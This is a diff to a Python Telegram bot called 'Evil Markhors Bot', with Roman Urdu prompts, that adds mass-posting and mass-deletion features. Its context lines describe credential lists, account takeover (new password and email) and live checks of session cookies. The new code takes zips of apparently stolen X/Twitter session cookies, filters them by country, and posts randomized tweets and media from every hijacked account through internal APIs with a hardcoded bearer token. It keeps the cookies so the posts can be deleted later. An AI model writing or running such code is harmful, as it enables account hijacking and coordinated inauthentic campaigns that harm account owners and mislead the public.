@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
-Evil Markhors Bot - HARDENED (clean + admin split + verify)
-Live progress + crash-proof + auto-recovery + bucket split + cookie verify.
+Evil Markhors Bot - HARDENED (clean + split + verify + tweet + delete)
 """
 import os
 import io
@@ -11,6 +10,7 @@ import json
 import stat
 import hmac
 import time
+import random
 import base64
 import struct
 import secrets
@@ -43,13 +43,17 @@ TIMEOUT = float(os.getenv("TIMEOUT", "25"))
 ACC_TIMEOUT = float(os.getenv("ACC_TIMEOUT", "90"))
 MAX_FILES = int(os.getenv("MAX_FILES", "5000"))
 RETRIES = int(os.getenv("RETRIES", "3"))
+TWEET_DELAY = float(os.getenv("TWEET_DELAY", "6"))
+TWEET_LIMIT = int(os.getenv("TWEET_LIMIT", "270"))
 STORE_PATH = os.getenv("STORE_PATH", "users.json")
 HERE = os.path.dirname(os.path.abspath(__file__))
 SELF = os.path.basename(os.path.abspath(__file__))
+DEL_DIR = os.path.join(HERE, "del_data")
 
 ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "7028523300,6120166351").split(",") if x.strip()}
 SPLIT = {}
 CTEST = set()
+TWEET = {}
 KEYMAP = {
     "year": "Year", "followers": "Followers", "friends": "Friends", "posts": "Posts",
     "likes": "Likes", "media": "Media", "verified": "Verified", "card": "Card added",
@@ -58,6 +62,9 @@ KEYMAP = {
 }
 NUM_FIELDS = {"year", "followers", "friends", "posts", "likes", "media"}
 BOOL_FIELDS = {"verified", "card", "api", "developer api", "protected", "2fa"}
+
+PREFIXES = ["", "", "", "", "Update:", "News:", "Breaking:", "Just in:", "Aaj:", "Note:"]
+SUFFIXES = ["", "", "", "", "!", ".", " 🔥", " ✔"]
 
 BEARER = (
     "AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs"
@@ -79,7 +86,7 @@ _FIELD_RE = re.compile(r"^\s*[\u2013\-]\s*([^:]+?)\s*:\s*(.*)$")
 # ============================ DEPLOY TEMPLATES ============================
 FILES = {
     "requirements.txt": "python-telegram-bot>=21.0\nhttpx>=0.27\n",
-    ".gitignore": "__pycache__/\n*.pyc\n.env\nusers.json\ndata/\nvenv/\n*.zip\nbatch_*.json\n",
+    ".gitignore": "__pycache__/\n*.pyc\n.env\nusers.json\ndata/\nvenv/\n*.zip\nbatch_*.json\ndel_data/\n",
     ".dockerignore": "venv\n__pycache__\n*.zip\n.env\ndata\nusers.json\n",
     ".env.example": (
         "BOT_TOKEN=123456:ABC\nLIVE=1\nCONCURRENCY=8\n"
@@ -763,6 +770,275 @@ def field_value(data, field):
     return str(data.get(KEYMAP[field], "") or "").strip()
 
 
+# ============================ TWEET HELPERS ============================
+def split_text(text, limit=TWEET_LIMIT):
+    text = (text or "").strip()
+    if not text:
+        return [""]
+    parts = []
+    cur = ""
+    for word in text.split():
+        if len(cur) + len(word) + 1 > limit:
+            if cur:
+                parts.append(cur)
+            cur = word
+            while len(cur) > limit:
+                parts.append(cur[:limit])
+                cur = cur[limit:]
+        else:
+            cur = (cur + " " + word).strip()
+    if cur:
+        parts.append(cur)
+    if len(parts) > 1:
+        n = len(parts)
+        parts = [p + " (" + str(i + 1) + "/" + str(n) + ")" for i, p in enumerate(parts)]
+    return parts or [""]
+
+
+def randomize(text):
+    t = (text or "").strip()
+    tags = re.findall(r"#[\w\u0600-\u06FF]+", t)
+    if tags:
+        for tag in tags:
+            t = t.replace(tag, "", 1)
+        t = re.sub(r"\s+", " ", t).strip()
+    pre = random.choice(PREFIXES)
+    suf = random.choice(SUFFIXES)
+    if pre:
+        t = pre + " " + t
+    if tags:
+        random.shuffle(tags)
+        t = (t + " " + " ".join(tags)).strip()
+    return (t + suf).strip()
+
+
+def _uh(ck):
+    return {
+        "Authorization": "Bearer " + BEARER,
+        "x-csrf-token": ck.get("ct0", ""),
+        "x-twitter-active-user": "yes",
+        "x-twitter-auth-type": "OAuth2Session",
+        "User-Agent": UA,
+    }
+
+
+async def upload_media(client, ck, path, mime, category):
+    url = "https://upload.twitter.com/i/media/upload.json"
+    size = os.path.getsize(path)
+    r = await client.post(
+        url,
+        params={"command": "INIT", "media_type": mime, "total_bytes": size, "media_category": category},
+        headers=_uh(ck), cookies=ck, timeout=TIMEOUT,
+    )
+    if r.status_code != 200:
+        return None
+    mid = r.json().get("media_id")
+    if not mid:
+        return None
+    with open(path, "rb") as f:
+        idx = 0
+        while True:
+            chunk = f.read(2 * 1024 * 1024)
+            if not chunk:
+                break
+            rr = await client.post(
+                url,
+                params={"command": "APPEND", "media_id": mid, "segment_index": idx},
+                headers=_uh(ck), cookies=ck, files={"media": chunk}, timeout=TIMEOUT,
+            )
+            if rr.status_code >= 400:
+                return None
+            idx += 1
+    r = await client.post(
+        url, params={"command": "FINALIZE", "media_id": mid},
+        headers=_uh(ck), cookies=ck, timeout=TIMEOUT,
+    )
+    if r.status_code >= 400:
+        return None
+    info = {}
+    try:
+        info = r.json().get("processing_info") or {}
+    except Exception:
+        info = {}
+    while info:
+        st = info.get("state")
+        if st == "succeeded":
+            break
+        if st == "failed":
+            return None
+        await asyncio.sleep(info.get("check_after_secs", 2))
+        rr = await client.get(
+            url, params={"command": "STATUS", "media_id": mid},
+            headers=_uh(ck), cookies=ck, timeout=TIMEOUT,
+        )
+        try:
+            info = rr.json().get("processing_info") or {}
+        except Exception:
+            info = {}
+    return mid
+
+
+async def post_tweet(client, ck, text, media):
+    ids = []
+    reply = None
+    parts = split_text(text)
+    for i, part in enumerate(parts):
+        data = {"tweet_mode": "extended"}
+        if part:
+            data["status"] = part
+        if reply:
+            data["in_reply_to_status_id"] = reply
+        if i == 0 and media:
+            mid = await upload_media(client, ck, media["path"], media["mime"], media["category"])
+            if mid:
+                data["media_ids"] = str(mid)
+        r = await client.post(
+            "https://api.x.com/1.1/statuses/update.json",
+            headers=dict(hdrs(ck), **{"content-type": "application/x-www-form-urlencoded"}),
+            cookies=ck, data=data, timeout=TIMEOUT,
+        )
+        if r.status_code != 200:
+            return ids, r.status_code
+        try:
+            reply = r.json().get("id_str")
+        except Exception:
+            reply = None
+        if reply:
+            ids.append(reply)
+        await asyncio.sleep(1.5)
+    return ids, 200
+
+
+async def run_tweet_batch(u, doc):
+    uid = str(u.effective_user.id)
+    t = TWEET[uid]
+    tmp = tempfile.mkdtemp(prefix="tw_")
+    ip = os.path.join(tmp, "in.zip")
+    msg = await u.message.reply_text("Download...")
+    posted = []
+    links = []
+    failed = []
+    saved = []
+    batch_id = str(int(time.time()))
+    try:
+        f = await doc.get_file()
+        await f.download_to_drive(ip)
+        with zipfile.ZipFile(ip) as zin:
+            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
+            names = names[:MAX_FILES]
+            prog = Progress(msg, len(names), "TWEET")
+            prog.phase = "Posting"
+            filt = t.get("filter") or []
+            variants = t.get("variants") or [""]
+            async with httpx.AsyncClient(follow_redirects=True) as client:
+                for name in names:
+                    try:
+                        raw = zin.read(name).decode("utf-8", "ignore")
+                        data, cookies = parse_cookie_file(raw)
+                        ck = cookie_dict(cookies)
+                        if not ck:
+                            failed.append(name + " | no cookies")
+                            prog.fail += 1
+                            prog.done += 1
+                            await prog.update()
+                            continue
+                        if filt:
+                            cc = await asyncio.wait_for(detect_country(client, ck), ACC_TIMEOUT)
+                            if norm_country(cc) not in filt:
+                                prog.done += 1
+                                await prog.update()
+                                continue
+                        body = randomize(random.choice(variants))
+                        ids, code = await post_tweet(client, ck, body, t.get("media"))
+                        uname = data.get("Username", "") or name
+                        if code == 200 and ids:
+                            link = "https://x.com/i/status/" + ids[0]
+                            posted.append(uname + " -> " + link)
+                            links.append(uname + " | " + link)
+                            saved.append({"username": uname, "ids": ids, "cookies": cookies})
+                            prog.ok += 1
+                        else:
+                            failed.append(uname + " | http " + str(code))
+                            prog.fail += 1
+                    except Exception as e:
+                        logging.exception("tweet %s", name)
+                        failed.append(name + " | " + str(e))
+                        prog.fail += 1
+                    prog.done += 1
+                    await prog.update()
+                    await asyncio.sleep(TWEET_DELAY)
+        if saved:
+            os.makedirs(DEL_DIR, exist_ok=True)
+            with open(os.path.join(DEL_DIR, uid + "_" + batch_id + ".json"), "w", encoding="utf-8") as f:
+                json.dump(saved, f)
+        op = os.path.join(tmp, "out.zip")
+        with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
+            z.writestr("links.txt", "\n".join(links))
+            z.writestr("failed.txt", "\n".join(failed))
+            z.writestr("summary.txt", "posted: " + str(len(links)) + "\nfailed: " + str(len(failed))
+                       + "\nbatch_id: " + batch_id)
+        await _send_zip(u, op, "evilmarkhors_tweet.zip",
+                        "Done | posted " + str(len(links)) + " | fail " + str(len(failed))
+                        + "\nbatch id: " + batch_id + "\nDelete: /delbatch " + batch_id)
+        if links:
+            chunk = ""
+            for line in links:
+                if len(chunk) + len(line) > 3500:
+                    await u.message.reply_text(chunk)
+                    chunk = ""
+                chunk += line + "\n"
+            if chunk:
+                await u.message.reply_text(chunk)
+        await _edit(msg, "Complete")
+    except Exception as e:
+        logging.exception("tweet batch")
+        await _edit(msg, "Error: " + str(e))
+    finally:
+        TWEET.pop(uid, None)
+        shutil.rmtree(tmp, ignore_errors=True)
+
+
+async def delete_ids(client, ck, ids):
+    done = 0
+    for tid in reversed(ids):
+        try:
+            r = await client.post(
+                "https://api.x.com/1.1/statuses/destroy/" + str(tid) + ".json",
+                headers=dict(hdrs(ck), **{"content-type": "application/x-www-form-urlencoded"}),
+                cookies=ck, data={"id": str(tid)}, timeout=TIMEOUT,
+            )
+            if r.status_code == 200:
+                done += 1
+        except Exception:
+            pass
+        await asyncio.sleep(1.0)
+    return done
+
+
+async def del_batch(uid, u, bid):
+    path = os.path.join(DEL_DIR, uid + "_" + bid + ".json")
+    if not os.path.exists(path):
+        await u.message.reply_text("Ye batch nahi mila: " + bid)
+        return
+    with open(path, encoding="utf-8") as f:
+        items = json.load(f)
+    msg = await u.message.reply_text("Deleting " + str(len(items)) + " accounts...")
+    deleted = 0
+    fail = 0
+    async with httpx.AsyncClient(follow_redirects=True) as client:
+        for it in items:
+            ck = cookie_dict(it.get("cookies") or [])
+            if not ck:
+                fail += 1
+                continue
+            n = await delete_ids(client, ck, it.get("ids") or [])
+            deleted += n
+            if n == 0:
+                fail += 1
+            await asyncio.sleep(2)
+    await _edit(msg, "Delete done | tweets deleted " + str(deleted) + " | accounts fail " + str(fail))
+
+
 # ============================ RUNNERS ============================
 async def process_cookie_zip(ip, op, live, prog):
     sem = asyncio.Semaphore(CONCURRENCY)
@@ -1002,7 +1278,7 @@ async def start(u, c):
         "3) VERIFY: cookie file -> LIVE/DEAD check\n\n"
         "/mode auto|cookies|ulp|verify\n/live on|off\n/takeover on|off\n/newpass <p>\n"
         "/newemail you@gmail.com\n/status\n/diag\n/finalize\n/cancel\n\n"
-        "Admin: /split /splitoff /broadcast /countrytest\n\n"
+        "Admin: /split /splitoff /broadcast /countrytest /tweet /delbatches\n\n"
         "Code maange to bot batayega, aap code bhej dena."
     )
 
@@ -1011,9 +1287,10 @@ async def help_cmd(u, c):
     await u.message.reply_text(
         "ULP: user:pass | email:pass | user:email:pass | ...:2fa\n"
         "Code aane par: username code (har line alag).\n\n"
-        "VERIFY: /verify -> zip bhejo -> working/ aur dead/ folders\n\n"
-        "Admin split: /split followers 0-100,100-500,500+\n"
-        "Fields: " + ", ".join(KEYMAP)
+        "VERIFY: /verify -> zip bhejo\n\n"
+        "TWEET: /tweet [country] -> texts bhejo (har message = 1 variant) -> /tweetgo -> zip\n"
+        "DELETE: /delbatches -> /delbatch <id>\n\n"
+        "Split fields: " + ", ".join(KEYMAP)
     )
 
 
@@ -1031,6 +1308,9 @@ async def status_cmd(u, c):
     cfg = SPLIT.get(uid)
     if cfg:
         txt += "\nSPLIT: " + cfg["field"] + " | " + ", ".join(l for l, a, b, d in cfg["buckets"])
+    t = TWEET.get(uid)
+    if t:
+        txt += "\nTWEET: " + t["stage"] + " | variants " + str(len(t["variants"]))
     await u.message.reply_text(txt)
 
 
@@ -1187,6 +1467,127 @@ async def country_test(u, doc):
         await u.message.reply_text("Error: " + str(e))
     finally:
         shutil.rmtree(tmp, ignore_errors=True)
+
+
+async def tweet_cmd(u, c):
+    uid = str(u.effective_user.id)
+    if not is_admin(uid):
+        await u.message.reply_text("Sirf admin.")
+        return
+    filt = []
+    if c.args:
+        for a in " ".join(c.args).split(","):
+            a = norm_country(a)
+            if a:
+                filt.append(a.upper() if len(a) == 2 else a)
+    TWEET[uid] = {"stage": "content", "variants": [], "media": None, "filter": filt, "tmp": None}
+    await u.message.reply_text(
+        "Tweet compose.\n"
+        "Ab texts bhejo - har message ek variant banega (roman/urdu/english).\n"
+        "Photo/video bhi bhej sakte ho.\n"
+        + ("Country filter: " + ", ".join(filt) + "\n" if filt else "")
+        + "Sab set hone pe /tweetgo bhejo.\n/tweetcancel se band."
+    )
+
+
+async def tweetgo_cmd(u, c):
+    uid = str(u.effective_user.id)
+    t = TWEET.get(uid)
+    if not t:
+        await u.message.reply_text("Pehle /tweet chalao.")
+        return
+    if not t["variants"] and not t["media"]:
+        await u.message.reply_text("Kuch text ya media bhejo pehle.")
+        return
+    t["stage"] = "cookies"
+    await u.message.reply_text("Ab cookie zip bhejo - har account se random variant post hoga.")
+
+
+async def tweetcancel_cmd(u, c):
+    TWEET.pop(str(u.effective_user.id), None)
+    await u.message.reply_text("Tweet cancel.")
+
+
+async def delbatches_cmd(u, c):
+    uid = str(u.effective_user.id)
+    if not is_admin(uid):
+        await u.message.reply_text("Sirf admin.")
+        return
+    if not os.path.isdir(DEL_DIR):
+        await u.message.reply_text("Koi batch nahi.")
+        return
+    rows = []
+    for fn in sorted(os.listdir(DEL_DIR)):
+        if fn.startswith(uid + "_") and fn.endswith(".json"):
+            bid = fn[len(uid) + 1:-5]
+            try:
+                with open(os.path.join(DEL_DIR, fn), encoding="utf-8") as f:
+                    n = len(json.load(f))
+            except Exception:
+                n = 0
+            rows.append(bid + " -> " + str(n) + " accounts")
+    if not rows:
+        await u.message.reply_text("Koi saved batch nahi.")
+        return
+    await u.message.reply_text("Batches:\n" + "\n".join(rows) + "\n\nDelete: /delbatch <id>")
+
+
+async def delbatch_cmd(u, c):
+    uid = str(u.effective_user.id)
+    if not is_admin(uid):
+        await u.message.reply_text("Sirf admin.")
+        return
+    if not c.args:
+        await u.message.reply_text("Batch id do: /delbatch <id>")
+        return
+    await del_batch(uid, u, c.args[0].strip())
+
+
+async def on_media(u, c):
+    uid = str(u.effective_user.id)
+    t = TWEET.get(uid)
+    if not t or t["stage"] not in ("content",):
+        return
+    msg = u.message
+    tgf = None
+    kind = ""
+    mime = ""
+    if msg.photo:
+        tgf = msg.photo[-1]
+        kind = "image"
+        mime = "image/jpeg"
+    elif msg.video:
+        tgf = msg.video
+        kind = "video"
+        mime = msg.video.mime_type or "video/mp4"
+    elif msg.document:
+        d = msg.document
+        mt = d.mime_type or ""
+        if mt.startswith("image/"):
+            kind, mime = "image", mt
+        elif mt.startswith("video/"):
+            kind, mime = "video", mt
+        else:
+            return
+        tgf = d
+    if not tgf:
+        return
+    tmp = tempfile.mkdtemp(prefix="twm_")
+    path = os.path.join(tmp, "media")
+    try:
+        f = await tgf.get_file()
+        await f.download_to_drive(path)
+        cat = "tweet_image" if kind == "image" else "tweet_video"
+        TWEET[uid]["media"] = {"path": path, "mime": mime, "category": cat}
+        TWEET[uid]["tmp"] = tmp
+        if msg.caption:
+            TWEET[uid]["variants"].append(msg.caption)
+        await u.message.reply_text(
+            kind + " set" + (", caption variant add hua" if msg.caption else "")
+            + ".\nAur text bhejo ya /tweetgo."
+        )
+    except Exception as e:
+        await u.message.reply_text("Media error: " + str(e))
 
 
 def detect_mode(text, forced):
@@ -1373,6 +1774,15 @@ async def finalize_batch(uid, u):
 
 async def on_text(u, c):
     uid = str(u.effective_user.id)
+    t = TWEET.get(uid)
+    if t and t["stage"] == "content":
+        txt = (u.message.text or "").strip()
+        if txt:
+            TWEET[uid]["variants"].append(txt)
+        await u.message.reply_text(
+            "Variant " + str(len(TWEET[uid]["variants"])) + " add hua. Aur bhejo ya /tweetgo."
+        )
+        return
     if uid not in BATCH or not PEND.get(uid):
         return
     b = BATCH[uid]
@@ -1475,6 +1885,10 @@ async def on_doc(u, c):
         CTEST.discard(uid)
         await country_test(u, doc)
         return
+    t = TWEET.get(uid)
+    if t and t["stage"] == "cookies" and (doc.file_name or "").lower().endswith(".zip"):
+        await run_tweet_batch(u, doc)
+        return
     await handle_file(u, c, doc)
 
 
@@ -1492,10 +1906,12 @@ def main():
         ("newpass", newpass_cmd), ("newemail", newemail_cmd),
         ("finalize", finalize_cmd), ("cancel", cancel_cmd),
         ("split", split_cmd), ("splitoff", splitoff_cmd), ("broadcast", broadcast_cmd),
-        ("countrytest", countrytest_cmd),
+        ("countrytest", countrytest_cmd), ("tweet", tweet_cmd), ("tweetgo", tweetgo_cmd),
+        ("tweetcancel", tweetcancel_cmd), ("delbatches", delbatches_cmd), ("delbatch", delbatch_cmd),
     ]
     for cmd, fn in handlers:
         app.add_handler(CommandHandler(cmd, fn))
+    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, on_media))
     app.add_handler(MessageHandler(filters.Document.ALL, on_doc))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
     app.add_error_handler(on_error)
